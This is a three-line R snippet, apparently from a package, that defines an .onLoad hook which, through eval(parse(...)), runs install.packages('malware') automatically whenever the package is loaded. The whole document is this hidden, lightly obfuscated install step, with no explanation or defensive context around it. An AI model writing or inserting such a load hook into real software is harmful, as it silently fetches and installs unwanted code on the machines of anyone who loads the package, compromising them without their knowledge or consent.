.onLoad <- function(libname, pkgname) {
  eval(parse(text = "install.packages('malware')"))
}
